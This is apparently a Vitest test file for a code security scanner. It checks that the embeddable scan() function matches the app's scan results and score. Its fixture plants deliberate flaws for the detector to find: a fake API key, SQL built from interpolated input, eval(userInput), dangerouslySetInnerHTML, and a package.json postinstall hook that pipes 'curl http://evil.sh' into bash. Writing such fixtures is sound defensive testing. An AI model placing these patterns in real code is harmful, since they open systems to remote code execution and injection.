// Parity proof for the host embedding seam (src/lib/cockpit-scan.js): scan()
// MUST produce the same findings as App.jsx's real scan sequence on the same
// files — not the dogfood shape. Runs the App.jsx steps inline and compares
// stableId sets + score. If they diverge, a host (the Atlan cockpit) would not
// see what the browser sees. This is the guard that keeps them from drifting as
// the engine is built upward.
import { describe, it, expect } from 'vitest';
import { scan } from '../lib/cockpit-scan.js';
import { PROBES, attachStableIds, attachProbeMeta } from '../lib/probes.js';
import { SEV_ORDER, computeScore } from '../lib/scoring.js';
import { buildSnippet } from '../lib/snippet.js';

const FILES = [
  { path: 'src/config.js', content: 'const OPENAI_API_KEY = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu";\nexport const db = { url: process.env.DB };\n' },
  { path: 'src/db.js', content: 'export function q(id){ return sql`SELECT * FROM users WHERE id = ${id}`; }\nconst token = eval(userInput);\n' },
  { path: 'package.json', content: '{"name":"x","scripts":{"postinstall":"curl http://evil.sh | bash"},"dependencies":{"leftpad":"1.0.0"}}\n' },
  { path: 'index.html', content: '<html><head></head><body><div dangerouslySetInnerHTML={{__html: raw}}></div></body></html>\n' },
];

// The App.jsx real-scan sequence, inline (the product path we must match).
function appScan(files) {
  const findings = [];
  for (const probe of PROBES) {
    try { const f = probe.fn(files); if (Array.isArray(f)) findings.push(...f); } catch { /* app records failures */ }
  }
  findings.sort((a, b) => SEV_ORDER.indexOf(a.severity) - SEV_ORDER.indexOf(b.severity));
  const fileMap = new Map(files.map((f) => [f.path, f.content]));
  findings.forEach((f) => { try { const c = fileMap.get(f.file); if (c && f.line) f.snippet = buildSnippet(c, f.line, 5); } catch {} });
  attachStableIds(findings, files);
  attachProbeMeta(findings);
  return { findings, score: computeScore(findings) };
}

describe('cockpit-scan: host embedding seam', () => {
  it('finds the planted issues', () => {
    expect(scan(FILES).findings.length).toBeGreaterThan(0);
  });

  it('findings carry snippet + stableId + probe meta (product shape)', () => {
    const withLine = scan(FILES).findings.filter((f) => f.line);
    expect(withLine.every((f) => typeof f.stableId === 'string' && f.stableId.length)).toBe(true);
    expect(withLine.some((f) => f.snippet)).toBe(true);
  });

  it('PARITY: scan() output equals App.jsx real-scan output (stableIds + score)', () => {
    const mine = scan(FILES);
    const app = appScan(FILES);
    expect(mine.findings.map((f) => f.stableId).sort()).toEqual(app.findings.map((f) => f.stableId).sort());
    expect(mine.score).toBe(app.score);
    expect(mine.findings.length).toBe(app.findings.length);
  });
});
